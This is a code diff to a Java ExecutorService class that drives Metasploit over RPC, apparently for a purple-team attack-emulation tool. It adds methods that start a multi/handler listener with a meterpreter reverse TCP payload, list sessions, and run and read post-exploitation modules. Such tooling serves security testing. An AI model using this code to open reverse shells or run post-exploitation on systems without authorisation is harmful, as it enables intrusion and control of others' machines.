@@ -47,6 +47,32 @@ public class ExecutorService {
                 return (Bundle) bundle;
         }
 
+        public String exploitMultiHandler(String targetPlatform, String address, String port){
+                                String method = "module.execute";
+                ObjectNode node = JsonNodeFactory.instance.objectNode();
+                node.put("LHOST", address);
+                node.put("LPORT", port);
+                node.put("PAYLOAD", targetPlatform+"/x86/meterpreter_reverse_tcp");
+                Object[] params = new Object[] { "exploit", "multi/handler", node };
+                Map<String, JsonNode> result = gateway.executeCommand(method, params);
+                return result.get("job_id").asText();
+        }
+
+        public String sessionList(String jobId){
+                Map<String, JsonNode> result = gateway.executeCommand("session.list", new Object[]{});
+                return result.get(jobId)!=null ? result.get(jobId).asText(): null;
+        }
+
+        public String readPostModuleResult(String jobId){
+                Map<String, JsonNode> result = gateway.executeCommand("session.meterpreter_read", new Object[]{jobId});
+                return result.get("data")!=null ? result.get("data").asText(): null;
+        }
+
+        public String runPostModule(String jobId, String targetPlatform, String technique){
+                Map<String, JsonNode> result = gateway.executeCommand("session.meterpreter_run_single", new Object[]{jobId, "run post/"+targetPlatform+"/purple/"+technique});
+                return result.get("result")!=null ? result.get("result").asText(): null;
+        }
+
         public List<String> retrieveAttacks(Bundle bundle, String targetPlatform) throws ExecutorCustomException {
                 ImmutableList<BundleableObject> list = bundle.getObjects().asList();
                 List<String> postModules = new ArrayList<>();
@@ -90,7 +116,7 @@ public class ExecutorService {
                 node.put("PayloadUUIDName",  UUID.randomUUID().toString());
                 Object[] params = new Object[] { "payload", os + "/meterpreter_reverse_tcp", node };
                 Map<String, JsonNode> result = gateway.executeCommand(method, params);
-                return result.get("payload").asText();
+                return result.get("payload")!=null ? result.get("payload").asText():"Payload Generation failed";
         }
 
 }
